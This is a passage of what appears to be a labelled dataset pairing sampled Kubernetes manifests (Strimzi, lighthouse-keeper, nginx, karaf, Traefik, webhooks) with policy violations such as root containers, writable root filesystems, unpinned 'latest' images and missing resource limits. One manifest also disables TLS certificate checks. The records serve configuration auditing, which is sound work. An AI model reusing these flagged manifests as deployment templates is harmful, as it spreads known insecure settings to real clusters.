    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: strimzi-cluster-operator\n  labels:\n    app: strimzi\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: strimzi-cluster-operator\n      strimzi.io/kind: cluster-operator\n  template:\n    metadata:\n      labels:\n        name: strimzi-cluster-operator\n        strimzi.io/kind: cluster-operator\n    spec:\n      serviceAccountName: strimzi-cluster-operator\n      volumes:\n      - name: strimzi-tmp\n        emptyDir:\n          medium: Memory\n          sizeLimit: 1Mi\n      - name: co-config-volume\n        configMap:\n          name: strimzi-cluster-operator\n      containers:\n      - name: strimzi-cluster-operator\n        image: quay.io/strimzi/operator:latest\n        ports:\n        - containerPort: 8080\n          name: http\n        args:\n        - /opt/strimzi/bin/cluster_operator_run.sh\n        volumeMounts:\n        - name: strimzi-tmp\n          mountPath: /tmp\n        - name: co-config-volume\n          mountPath: /opt/strimzi/custom-config/\n        env:\n        - name: STRIMZI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: STRIMZI_FULL_RECONCILIATION_INTERVAL_MS\n          value: '120000'\n        - name: STRIMZI_OPERATION_TIMEOUT_MS\n          value: '300000'\n        - name: STRIMZI_DEFAULT_TLS_SIDECAR_ENTITY_OPERATOR_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-3.1.0\n        - name: STRIMZI_DEFAULT_KAFKA_EXPORTER_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-3.1.0\n        - name: STRIMZI_DEFAULT_CRUISE_CONTROL_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-3.1.0\n        - name: STRIMZI_DEFAULT_TLS_SIDECAR_CRUISE_CONTROL_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-3.1.0\n        - name: STRIMZI_KAFKA_IMAGES\n          value: '3.0.0=quay.io/strimzi/kafka:latest-kafka-3.0.0\n\n            3.1.0=quay.io/strimzi/kafka:latest-kafka-3.1.0\n\n            '\n        - name: STRIMZI_KAFKA_CONNECT_IMAGES\n          value: '3.0.0=quay.io/strimzi/kafka:latest-kafka-3.0.0\n\n            3.1.0=quay.io/strimzi/kafka:latest-kafka-3.1.0\n\n            '\n        - name: STRIMZI_KAFKA_MIRROR_MAKER_IMAGES\n          value: '3.0.0=quay.io/strimzi/kafka:latest-kafka-3.0.0\n\n            3.1.0=quay.io/strimzi/kafka:latest-kafka-3.1.0\n\n            '\n        - name: STRIMZI_KAFKA_MIRROR_MAKER_2_IMAGES\n          value: '3.0.0=quay.io/strimzi/kafka:latest-kafka-3.0.0\n\n            3.1.0=quay.io/strimzi/kafka:latest-kafka-3.1.0\n\n            '\n        - name: STRIMZI_DEFAULT_TOPIC_OPERATOR_IMAGE\n          value: quay.io/strimzi/operator:latest\n        - name: STRIMZI_DEFAULT_USER_OPERATOR_IMAGE\n          value: quay.io/strimzi/operator:latest\n        - name: STRIMZI_DEFAULT_KAFKA_INIT_IMAGE\n          value: quay.io/strimzi/operator:latest\n        - name: STRIMZI_DEFAULT_KAFKA_BRIDGE_IMAGE\n          value: quay.io/strimzi/kafka-bridge:0.21.3\n        - name: STRIMZI_DEFAULT_JMXTRANS_IMAGE\n          value: quay.io/strimzi/jmxtrans:latest\n        - name: STRIMZI_DEFAULT_KANIKO_EXECUTOR_IMAGE\n          value: quay.io/strimzi/kaniko-executor:latest\n        - name: STRIMZI_DEFAULT_MAVEN_BUILDER\n          value: quay.io/strimzi/maven-builder:latest\n        - name: STRIMZI_OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: STRIMZI_FEATURE_GATES\n          value: ''\n        livenessProbe:\n          httpGet:\n            path: /healthy\n            port: http\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        readinessProbe:\n          httpGet:\n            path: /ready\n            port: http\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 384Mi\n          requests:\n            cpu: 200m\n            memory: 384Mi\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"strimzi-cluster-operator\" not found"
  },
  {
    "id": "8429",
    "manifest_path": "data/manifests/the_stack_sample/sample_3132.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: strimzi-cluster-operator\n  labels:\n    app: strimzi\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: strimzi-cluster-operator\n      strimzi.io/kind: cluster-operator\n  template:\n    metadata:\n      labels:\n        name: strimzi-cluster-operator\n        strimzi.io/kind: cluster-operator\n    spec:\n      serviceAccountName: strimzi-cluster-operator\n      volumes:\n      - name: strimzi-tmp\n        emptyDir:\n          medium: Memory\n          sizeLimit: 1Mi\n      - name: co-config-volume\n        configMap:\n          name: strimzi-cluster-operator\n      containers:\n      - name: strimzi-cluster-operator\n        image: quay.io/strimzi/operator:latest\n        ports:\n        - containerPort: 8080\n          name: http\n        args:\n        - /opt/strimzi/bin/cluster_operator_run.sh\n        volumeMounts:\n        - name: strimzi-tmp\n          mountPath: /tmp\n        - name: co-config-volume\n          mountPath: /opt/strimzi/custom-config/\n        env:\n        - name: STRIMZI_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: STRIMZI_FULL_RECONCILIATION_INTERVAL_MS\n          value: '120000'\n        - name: STRIMZI_OPERATION_TIMEOUT_MS\n          value: '300000'\n        - name: STRIMZI_DEFAULT_TLS_SIDECAR_ENTITY_OPERATOR_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-3.1.0\n        - name: STRIMZI_DEFAULT_KAFKA_EXPORTER_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-3.1.0\n        - name: STRIMZI_DEFAULT_CRUISE_CONTROL_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-3.1.0\n        - name: STRIMZI_DEFAULT_TLS_SIDECAR_CRUISE_CONTROL_IMAGE\n          value: quay.io/strimzi/kafka:latest-kafka-3.1.0\n        - name: STRIMZI_KAFKA_IMAGES\n          value: '3.0.0=quay.io/strimzi/kafka:latest-kafka-3.0.0\n\n            3.1.0=quay.io/strimzi/kafka:latest-kafka-3.1.0\n\n            '\n        - name: STRIMZI_KAFKA_CONNECT_IMAGES\n          value: '3.0.0=quay.io/strimzi/kafka:latest-kafka-3.0.0\n\n            3.1.0=quay.io/strimzi/kafka:latest-kafka-3.1.0\n\n            '\n        - name: STRIMZI_KAFKA_MIRROR_MAKER_IMAGES\n          value: '3.0.0=quay.io/strimzi/kafka:latest-kafka-3.0.0\n\n            3.1.0=quay.io/strimzi/kafka:latest-kafka-3.1.0\n\n            '\n        - name: STRIMZI_KAFKA_MIRROR_MAKER_2_IMAGES\n          value: '3.0.0=quay.io/strimzi/kafka:latest-kafka-3.0.0\n\n            3.1.0=quay.io/strimzi/kafka:latest-kafka-3.1.0\n\n            '\n        - name: STRIMZI_DEFAULT_TOPIC_OPERATOR_IMAGE\n          value: quay.io/strimzi/operator:latest\n        - name: STRIMZI_DEFAULT_USER_OPERATOR_IMAGE\n          value: quay.io/strimzi/operator:latest\n        - name: STRIMZI_DEFAULT_KAFKA_INIT_IMAGE\n          value: quay.io/strimzi/operator:latest\n        - name: STRIMZI_DEFAULT_KAFKA_BRIDGE_IMAGE\n          value: quay.io/strimzi/kafka-bridge:0.21.3\n        - name: STRIMZI_DEFAULT_JMXTRANS_IMAGE\n          value: quay.io/strimzi/jmxtrans:latest\n        - name: STRIMZI_DEFAULT_KANIKO_EXECUTOR_IMAGE\n          value: quay.io/strimzi/kaniko-executor:latest\n        - name: STRIMZI_DEFAULT_MAVEN_BUILDER\n          value: quay.io/strimzi/maven-builder:latest\n        - name: STRIMZI_OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: STRIMZI_FEATURE_GATES\n          value: ''\n        livenessProbe:\n          httpGet:\n            path: /healthy\n            port: http\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        readinessProbe:\n          httpGet:\n            path: /ready\n            port: http\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 384Mi\n          requests:\n            cpu: 200m\n            memory: 384Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"strimzi-cluster-operator\" is not set to runAsNonRoot"
  },
  {
    "id": "8430",
    "manifest_path": "data/manifests/the_stack_sample/sample_3137.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-keeper\n  labels:\n    chart: lighthouse-1.0.21\n    app: lighthouse-keeper\n    gitops.jenkins-x.io/pipeline: namespaces\n  namespace: jx\n  annotations:\n    wave.pusher.com/update-on-config-change: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-keeper\n  template:\n    metadata:\n      annotations:\n        ad.datadoghq.com/keeper.logs: '[{\"source\":\"lighthouse\",\"service\":\"keeper\"}]'\n        prometheus.io/port: '9090'\n        prometheus.io/scrape: 'true'\n        jenkins-x.io/hash: 041d84084a2d07fec2231f08464d4a0d57dbe037f2f989146bc992a0ced8313e\n      labels:\n        app: lighthouse-keeper\n    spec:\n      serviceAccountName: lighthouse-keeper\n      containers:\n      - name: lighthouse-keeper\n        image: gcr.io/jenkinsxio/lighthouse-keeper:1.0.21\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        ports:\n        - name: http\n          containerPort: 8888\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /\n            port: http\n          initialDelaySeconds: 120\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /\n            port: http\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: jnsrikanth\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LIGHTHOUSE_KEEPER_STATUS_CONTEXT_LABEL\n          value: Lighthouse Merge Status\n        - name: LIGHTHOUSE_TRIGGER_ON_MISSING\n          value: disable\n        resources:\n          limits:\n            cpu: 400m\n            memory: 512Mi\n          requests:\n            cpu: 100m\n            memory: 128Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"lighthouse-keeper\" does not have a read-only root file system"
  },
  {
    "id": "8431",
    "manifest_path": "data/manifests/the_stack_sample/sample_3137.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-keeper\n  labels:\n    chart: lighthouse-1.0.21\n    app: lighthouse-keeper\n    gitops.jenkins-x.io/pipeline: namespaces\n  namespace: jx\n  annotations:\n    wave.pusher.com/update-on-config-change: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-keeper\n  template:\n    metadata:\n      annotations:\n        ad.datadoghq.com/keeper.logs: '[{\"source\":\"lighthouse\",\"service\":\"keeper\"}]'\n        prometheus.io/port: '9090'\n        prometheus.io/scrape: 'true'\n        jenkins-x.io/hash: 041d84084a2d07fec2231f08464d4a0d57dbe037f2f989146bc992a0ced8313e\n      labels:\n        app: lighthouse-keeper\n    spec:\n      serviceAccountName: lighthouse-keeper\n      containers:\n      - name: lighthouse-keeper\n        image: gcr.io/jenkinsxio/lighthouse-keeper:1.0.21\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        ports:\n        - name: http\n          containerPort: 8888\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /\n            port: http\n          initialDelaySeconds: 120\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /\n            port: http\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: jnsrikanth\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LIGHTHOUSE_KEEPER_STATUS_CONTEXT_LABEL\n          value: Lighthouse Merge Status\n        - name: LIGHTHOUSE_TRIGGER_ON_MISSING\n          value: disable\n        resources:\n          limits:\n            cpu: 400m\n            memory: 512Mi\n          requests:\n            cpu: 100m\n            memory: 128Mi\n",
    "policy_id": "non-existent-service-account",
    "violation_text": "serviceAccount \"lighthouse-keeper\" not found"
  },
  {
    "id": "8432",
    "manifest_path": "data/manifests/the_stack_sample/sample_3137.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: lighthouse-keeper\n  labels:\n    chart: lighthouse-1.0.21\n    app: lighthouse-keeper\n    gitops.jenkins-x.io/pipeline: namespaces\n  namespace: jx\n  annotations:\n    wave.pusher.com/update-on-config-change: 'true'\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: lighthouse-keeper\n  template:\n    metadata:\n      annotations:\n        ad.datadoghq.com/keeper.logs: '[{\"source\":\"lighthouse\",\"service\":\"keeper\"}]'\n        prometheus.io/port: '9090'\n        prometheus.io/scrape: 'true'\n        jenkins-x.io/hash: 041d84084a2d07fec2231f08464d4a0d57dbe037f2f989146bc992a0ced8313e\n      labels:\n        app: lighthouse-keeper\n    spec:\n      serviceAccountName: lighthouse-keeper\n      containers:\n      - name: lighthouse-keeper\n        image: gcr.io/jenkinsxio/lighthouse-keeper:1.0.21\n        imagePullPolicy: IfNotPresent\n        args:\n        - --namespace=jx\n        ports:\n        - name: http\n          containerPort: 8888\n          protocol: TCP\n        livenessProbe:\n          httpGet:\n            path: /\n            port: http\n          initialDelaySeconds: 120\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        readinessProbe:\n          httpGet:\n            path: /\n            port: http\n          periodSeconds: 10\n          successThreshold: 1\n          timeoutSeconds: 1\n        env:\n        - name: GIT_KIND\n          value: github\n        - name: GIT_SERVER\n          value: https://github.com\n        - name: GIT_USER\n          value: jnsrikanth\n        - name: GIT_TOKEN\n          valueFrom:\n            secretKeyRef:\n              name: lighthouse-oauth-token\n              key: oauth\n        - name: JX_LOG_FORMAT\n          value: json\n        - name: LOGRUS_FORMAT\n          value: json\n        - name: LIGHTHOUSE_KEEPER_STATUS_CONTEXT_LABEL\n          value: Lighthouse Merge Status\n        - name: LIGHTHOUSE_TRIGGER_ON_MISSING\n          value: disable\n        resources:\n          limits:\n            cpu: 400m\n            memory: 512Mi\n          requests:\n            cpu: 100m\n            memory: 128Mi\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"lighthouse-keeper\" is not set to runAsNonRoot"
  },
  {
    "id": "8433",
    "manifest_path": "data/manifests/the_stack_sample/sample_3138.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-5946\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"nginx\" is using an invalid container image, \"nginx\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8434",
    "manifest_path": "data/manifests/the_stack_sample/sample_3138.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-5946\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"nginx\" does not have a read-only root file system"
  },
  {
    "id": "8435",
    "manifest_path": "data/manifests/the_stack_sample/sample_3138.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-5946\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"nginx\" is not set to runAsNonRoot"
  },
  {
    "id": "8436",
    "manifest_path": "data/manifests/the_stack_sample/sample_3138.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-5946\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"nginx\" has cpu request 0"
  },
  {
    "id": "8437",
    "manifest_path": "data/manifests/the_stack_sample/sample_3138.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: image-demo-5946\nspec:\n  containers:\n  - name: nginx\n    image: nginx\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"nginx\" has memory limit 0"
  },
  {
    "id": "8438",
    "manifest_path": "data/manifests/the_stack_sample/sample_3139.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: karaf-docker-example-static-dist\nspec:\n  containers:\n  - name: karaf-docker-example-static-dist-ctr\n    image: karaf:latest\n    resources:\n      limits:\n        memory: 500Mi\n      requests:\n        memory: 250Mi\n    command:\n    - karaf\n    - run\n    args:\n    - --vm\n    - '1'\n    - --vm-bytes\n    - 250M\n    - --vm-hang\n    - '1'\n",
    "policy_id": "latest-tag",
    "violation_text": "The container \"karaf-docker-example-static-dist-ctr\" is using an invalid container image, \"karaf:latest\". Please use images that are not blocked by the `BlockList` criteria : [\".*:(latest)$\" \"^[^:]*$\" \"(.*/[^:]+)$\"]"
  },
  {
    "id": "8439",
    "manifest_path": "data/manifests/the_stack_sample/sample_3139.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: karaf-docker-example-static-dist\nspec:\n  containers:\n  - name: karaf-docker-example-static-dist-ctr\n    image: karaf:latest\n    resources:\n      limits:\n        memory: 500Mi\n      requests:\n        memory: 250Mi\n    command:\n    - karaf\n    - run\n    args:\n    - --vm\n    - '1'\n    - --vm-bytes\n    - 250M\n    - --vm-hang\n    - '1'\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"karaf-docker-example-static-dist-ctr\" does not have a read-only root file system"
  },
  {
    "id": "8440",
    "manifest_path": "data/manifests/the_stack_sample/sample_3139.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: karaf-docker-example-static-dist\nspec:\n  containers:\n  - name: karaf-docker-example-static-dist-ctr\n    image: karaf:latest\n    resources:\n      limits:\n        memory: 500Mi\n      requests:\n        memory: 250Mi\n    command:\n    - karaf\n    - run\n    args:\n    - --vm\n    - '1'\n    - --vm-bytes\n    - 250M\n    - --vm-hang\n    - '1'\n",
    "policy_id": "run-as-non-root",
    "violation_text": "container \"karaf-docker-example-static-dist-ctr\" is not set to runAsNonRoot"
  },
  {
    "id": "8441",
    "manifest_path": "data/manifests/the_stack_sample/sample_3139.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Pod\nmetadata:\n  name: karaf-docker-example-static-dist\nspec:\n  containers:\n  - name: karaf-docker-example-static-dist-ctr\n    image: karaf:latest\n    resources:\n      limits:\n        memory: 500Mi\n      requests:\n        memory: 250Mi\n    command:\n    - karaf\n    - run\n    args:\n    - --vm\n    - '1'\n    - --vm-bytes\n    - 250M\n    - --vm-hang\n    - '1'\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"karaf-docker-example-static-dist-ctr\" has cpu request 0"
  },
  {
    "id": "8442",
    "manifest_path": "data/manifests/the_stack_sample/sample_3140.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  name: traefik\n  namespace: traefik-ingress-controller\nspec:\n  type: LoadBalancer\n  ports:\n  - protocol: TCP\n    name: web\n    port: 80\n  - protocol: TCP\n    name: websecure\n    port: 443\n  selector:\n    app: traefik\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:traefik])"
  },
  {
    "id": "8443",
    "manifest_path": "data/manifests/the_stack_sample/sample_3142.yaml",
    "manifest_yaml": "apiVersion: v1\nkind: Service\nmetadata:\n  annotations:\n    include.release.openshift.io/self-managed-high-availability: 'true'\n    include.release.openshift.io/single-node-developer: 'true'\n    service.beta.openshift.io/serving-cert-secret-name: openshift-controller-manager-operator-serving-cert\n    exclude.release.openshift.io/internal-openshift-hosted: 'true'\n  labels:\n    app: openshift-controller-manager-operator\n  name: metrics\n  namespace: openshift-controller-manager-operator\nspec:\n  ports:\n  - name: https\n    port: 443\n    protocol: TCP\n    targetPort: 8443\n  selector:\n    app: openshift-controller-manager-operator\n  sessionAffinity: None\n  type: ClusterIP\n",
    "policy_id": "dangling-service",
    "violation_text": "no pods found matching service labels (map[app:openshift-controller-manager-operator])"
  },
  {
    "id": "8444",
    "manifest_path": "data/manifests/the_stack_sample/sample_3144.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: webhooks\n  name: webhooks\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: webhooks\n  template:\n    metadata:\n      labels:\n        app: webhooks\n    spec:\n      containers:\n      - env:\n        - name: CONFIG\n          value: /oada.config.js\n        - name: DEBUG\n          value: '*:error,*:warn,*:info'\n        - name: DOMAIN\n          value: localhost\n        - name: NODE_ENV\n          value: production\n        - name: NODE_TLS_REJECT_UNAUTHORIZED\n          value: '0'\n        - name: PINO_TRANSPORT\n          value: yarn g:pretty -clti pid,hostname\n        image: oada/webhooks:edge\n        securityContext:\n          runAsNonRoot: true\n          runAsUser: 1000\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        name: webhooks\n        volumeMounts:\n        - mountPath: /tmp\n          name: tmp\n      volumes:\n      - name: tmp\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "unset-cpu-requirements",
    "violation_text": "container \"webhooks\" has cpu request 0"
  },
  {
    "id": "8445",
    "manifest_path": "data/manifests/the_stack_sample/sample_3144.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  labels:\n    app: webhooks\n  name: webhooks\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: webhooks\n  template:\n    metadata:\n      labels:\n        app: webhooks\n    spec:\n      containers:\n      - env:\n        - name: CONFIG\n          value: /oada.config.js\n        - name: DEBUG\n          value: '*:error,*:warn,*:info'\n        - name: DOMAIN\n          value: localhost\n        - name: NODE_ENV\n          value: production\n        - name: NODE_TLS_REJECT_UNAUTHORIZED\n          value: '0'\n        - name: PINO_TRANSPORT\n          value: yarn g:pretty -clti pid,hostname\n        image: oada/webhooks:edge\n        securityContext:\n          runAsNonRoot: true\n          runAsUser: 1000\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        name: webhooks\n        volumeMounts:\n        - mountPath: /tmp\n          name: tmp\n      volumes:\n      - name: tmp\n        emptyDir:\n          medium: Memory\n",
    "policy_id": "unset-memory-requirements",
    "violation_text": "container \"webhooks\" has memory limit 0"
  },
  {
    "id": "8446",
    "manifest_path": "data/manifests/the_stack_sample/sample_3147.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: strimzi-cluster-operator\n  labels:\n    app: strimzi\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: strimzi-cluster-operator\n      strimzi.io/kind: cluster-operator\n  template:\n    metadata:\n      labels:\n        name: strimzi-cluster-operator\n        strimzi.io/kind: cluster-operator\n    spec:\n      serviceAccountName: strimzi-cluster-operator\n      volumes:\n      - name: strimzi-tmp\n        emptyDir:\n          medium: Memory\n          sizeLimit: 1Mi\n      - name: co-config-volume\n        configMap:\n          name: strimzi-cluster-operator\n      containers:\n      - name: strimzi-cluster-operator\n        image: quay.io/strimzi/operator:0.27.1\n        ports:\n        - containerPort: 8080\n          name: http\n        args:\n        - /opt/strimzi/bin/cluster_operator_run.sh\n        volumeMounts:\n        - name: strimzi-tmp\n          mountPath: /tmp\n        - name: co-config-volume\n          mountPath: /opt/strimzi/custom-config/\n        env:\n        - name: STRIMZI_NAMESPACE\n          value: kafka\n        - name: STRIMZI_FULL_RECONCILIATION_INTERVAL_MS\n          value: '120000'\n        - name: STRIMZI_OPERATION_TIMEOUT_MS\n          value: '300000'\n        - name: STRIMZI_DEFAULT_TLS_SIDECAR_ENTITY_OPERATOR_IMAGE\n          value: quay.io/strimzi/kafka:0.27.1-kafka-3.0.0\n        - name: STRIMZI_DEFAULT_KAFKA_EXPORTER_IMAGE\n          value: quay.io/strimzi/kafka:0.27.1-kafka-3.0.0\n        - name: STRIMZI_DEFAULT_CRUISE_CONTROL_IMAGE\n          value: quay.io/strimzi/kafka:0.27.1-kafka-3.0.0\n        - name: STRIMZI_DEFAULT_TLS_SIDECAR_CRUISE_CONTROL_IMAGE\n          value: quay.io/strimzi/kafka:0.27.1-kafka-3.0.0\n        - name: STRIMZI_KAFKA_IMAGES\n          value: '2.8.0=quay.io/strimzi/kafka:0.27.1-kafka-2.8.0\n\n            2.8.1=quay.io/strimzi/kafka:0.27.1-kafka-2.8.1\n\n            3.0.0=quay.io/strimzi/kafka:0.27.1-kafka-3.0.0\n\n            '\n        - name: STRIMZI_KAFKA_CONNECT_IMAGES\n          value: '2.8.0=quay.io/strimzi/kafka:0.27.1-kafka-2.8.0\n\n            2.8.1=quay.io/strimzi/kafka:0.27.1-kafka-2.8.1\n\n            3.0.0=quay.io/strimzi/kafka:0.27.1-kafka-3.0.0\n\n            '\n        - name: STRIMZI_KAFKA_MIRROR_MAKER_IMAGES\n          value: '2.8.0=quay.io/strimzi/kafka:0.27.1-kafka-2.8.0\n\n            2.8.1=quay.io/strimzi/kafka:0.27.1-kafka-2.8.1\n\n            3.0.0=quay.io/strimzi/kafka:0.27.1-kafka-3.0.0\n\n            '\n        - name: STRIMZI_KAFKA_MIRROR_MAKER_2_IMAGES\n          value: '2.8.0=quay.io/strimzi/kafka:0.27.1-kafka-2.8.0\n\n            2.8.1=quay.io/strimzi/kafka:0.27.1-kafka-2.8.1\n\n            3.0.0=quay.io/strimzi/kafka:0.27.1-kafka-3.0.0\n\n            '\n        - name: STRIMZI_DEFAULT_TOPIC_OPERATOR_IMAGE\n          value: quay.io/strimzi/operator:0.27.1\n        - name: STRIMZI_DEFAULT_USER_OPERATOR_IMAGE\n          value: quay.io/strimzi/operator:0.27.1\n        - name: STRIMZI_DEFAULT_KAFKA_INIT_IMAGE\n          value: quay.io/strimzi/operator:0.27.1\n        - name: STRIMZI_DEFAULT_KAFKA_BRIDGE_IMAGE\n          value: quay.io/strimzi/kafka-bridge:0.21.3\n        - name: STRIMZI_DEFAULT_JMXTRANS_IMAGE\n          value: quay.io/strimzi/jmxtrans:0.27.1\n        - name: STRIMZI_DEFAULT_KANIKO_EXECUTOR_IMAGE\n          value: quay.io/strimzi/kaniko-executor:0.27.1\n        - name: STRIMZI_DEFAULT_MAVEN_BUILDER\n          value: quay.io/strimzi/maven-builder:0.27.1\n        - name: STRIMZI_OPERATOR_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: STRIMZI_FEATURE_GATES\n          value: ''\n        livenessProbe:\n          httpGet:\n            path: /healthy\n            port: http\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        readinessProbe:\n          httpGet:\n            path: /ready\n            port: http\n          initialDelaySeconds: 10\n          periodSeconds: 30\n        resources:\n          limits:\n            cpu: 1000m\n            memory: 384Mi\n          requests:\n            cpu: 200m\n            memory: 384Mi\n",
    "policy_id": "no-read-only-root-fs",
    "violation_text": "container \"strimzi-cluster-operator\" does not have a read-only root file system"
  },
  {
    "id": "8447",
    "manifest_path": "data/manifests/the_stack_sample/sample_3147.yaml",
    "manifest_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: strimzi-cluster-operator\n  labels:\n    app: strimzi\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      name: strimzi-cluster-operator\n      strimzi.io/kind: cluster-operator\n  template:\n    metadata:\n      labels:\n        name: strimzi-cluster-operator\n        strimzi.io/kind: cluster-operator\n    spec:\n      serviceAccountName: strimzi-cluster-operator\n      volumes:\n      - name: strimzi-tmp\n        emptyDir:\n          medium: Memory\n          sizeLimit: 1Mi\n      - name: co-config-volume\n        configMap:\n          name: strimzi-cluster-operator\n      containers:\n      - name: strimzi-cluster-operator\n        image: quay.io/strimzi/operator:0.27.1\n        ports:\n        - containerPort: 8080\n          name: http\n        args:\n        - /opt/strimzi/bin/cluster_operator_run.sh\n        volumeMounts:\n        - name: strimzi-tmp\n          mountPath: /tmp\n        - name: co-config-volume\n          mountPath: /opt/strimzi/custom-config/\n        env:\n        - name: STRIMZI_NAMESPACE\n          value: kafka\n        - name: STRIMZI_FULL_RECONCILIATION_INTERVAL_MS\n          value: '120000'\n        - name: STRIMZI_OPERATION_TIMEOUT_MS\n          value: '300000'\n        - name: STRIMZI_DEFAULT_TLS_SIDECAR_ENTITY_OPERATOR_IMAGE\n          value: quay.io/strimzi/kafka:0.27.1-kafka-3.0.0\n        - name: STRIMZI_DEFAULT_KAFKA_EXPORTER_IMAGE\n          value: quay.io/strimzi/kafka:0.27.1-kafka-3.0.0\n        - name: STRIMZI_DEFAULT_CRUISE_CONTROL_IMAGE\n          value: quay.io/strimzi/kafka:0.27.1-kafka-3.0.0\n        - name: STRIMZI_DEFAULT_TLS_SIDECAR_CRUISE_CONTROL_IMAGE\n          value: quay.io/strimzi/kafka:0.27.1-kafka-3.0.0\n        - name: STRIMZI_KAFKA_IMAGES\n          value: 